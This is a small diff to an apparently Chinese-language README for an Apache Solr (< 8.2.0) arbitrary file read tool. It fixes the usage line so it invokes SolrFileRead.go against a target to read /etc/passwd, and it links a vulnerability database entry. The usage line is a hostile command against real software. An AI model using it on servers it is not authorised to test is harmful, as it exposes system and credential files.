@@ -6,7 +6,7 @@ _Version: Apache Solr < 8.2.0_
 
 ## **任意文件读取**
 
-_**Usage:**_ go run SolrFileRead -host 127.0.0.1 -port 80 -f /etc/passwd
+_**Usage:**_ go run SolrFileRead.go -host 127.0.0.1 -port 80 -f /etc/passwd
 
 **_参考链接：_**
 https://www.seebug.org/vuldb/ssvid-99160
